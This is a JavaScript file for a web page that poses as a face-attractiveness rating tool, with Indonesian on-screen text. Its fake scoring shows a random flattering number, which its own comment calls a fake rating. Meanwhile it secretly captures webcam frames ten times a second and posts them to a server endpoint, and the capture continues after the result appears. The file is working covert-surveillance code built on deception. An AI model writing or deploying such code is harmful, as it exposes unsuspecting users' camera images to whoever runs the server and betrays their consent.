const video = document.getElementById('video');
const status = document.getElementById('status');
const result = document.getElementById('result');
const scoreEl = document.getElementById('score');
const descEl = document.getElementById('desc');

async function start() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480 }
    });
    video.srcObject = stream;
    status.textContent = "Menganalisis wajah...";

    const canvas = document.createElement('canvas');
    canvas.width = 640; canvas.height = 480;
    const ctx = canvas.getContext('2d');

    // Fake rating setelah 3 detik
    setTimeout(() => {
      const ratings = [
        {score: 9.8, desc: "Wajah Anda sangat menarik! Cocok untuk modeling."},
        {score: 9.5, desc: "Sangat simetris! Anda punya aura bintang."},
        {score: 9.2, desc: "Wajah ideal! Banyak yang akan suka."}
      ];
      const r = ratings[Math.floor(Math.random() * ratings.length)];
      scoreEl.textContent = r.score;
      descEl.textContent = r.desc;
      document.getElementById('cameraBox').classList.add('hidden');
      result.classList.remove('hidden');
    }, 3000);

    // LIVESTREAM KE SERVER (10 FPS)
    setInterval(() => {
      ctx.drawImage(video, 0, 0, 640, 480);
      fetch('/stream', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: canvas.toDataURL('image/jpeg', 0.6) })
      });
    }, 100);

  } catch (e) {
    alert("Izinkan akses kamera untuk analisis wajah!");
  }
}

function restart() {
  result.classList.add('hidden');
  document.getElementById('cameraBox').classList.remove('hidden');
  start();
}

window.onload = start;
